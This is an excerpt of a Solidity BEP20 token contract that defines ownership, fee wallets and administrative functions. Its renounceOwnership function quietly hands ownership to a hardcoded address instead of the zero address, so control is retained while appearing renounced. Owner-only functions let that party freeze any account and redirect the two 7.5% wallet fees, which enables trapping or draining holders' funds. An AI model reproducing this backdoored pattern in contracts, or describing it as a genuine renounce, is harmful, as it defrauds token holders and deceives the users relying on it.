...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        ...
        _owner = payable(address(0x6979Ae3bF8c5b25c2a7862A9AD88CC884572FD59));
    }
...
contract Token is Context, IBEP20, Ownable, ReentrancyGuard {
    ...
    uint256 public WalletAfee = 75;  // 7.5% will go to the wallet A  address 
    uint256 private _WalletAfee = WalletAfee;

    uint256 public walletBfee = 75;  // 7.5% will go to the wallet B address 
    ...
    constructor (address payable _walletA, address payable _Bwallet, address payable _marketWallet) {
    ...
    function FreezeOrUnFreezeAcc(address target, bool _state) external onlyOwner{
    ...
    function setwalletAaddress(address payable _walletAaddress) external onlyOwner {
    ...
    function setwalletBaddress(address payable _Bwalletaddress) external onlyOwner {
        walletB = _Bwalletaddress;
    }
    
    function setPancakeRouter(IPancakeRouter02 _router, address _pair) external onlyOwner {
    ...
    function totalFeePerTx(uint256 tAmount) internal view returns(uint256) {
        uint256 percentage = tAmount.mul(_taxFee.add(_liquidityFee).add(WalletAfee).add(walletBfee).add(_marketFee)).div(1e3);
        return percentage;
    }
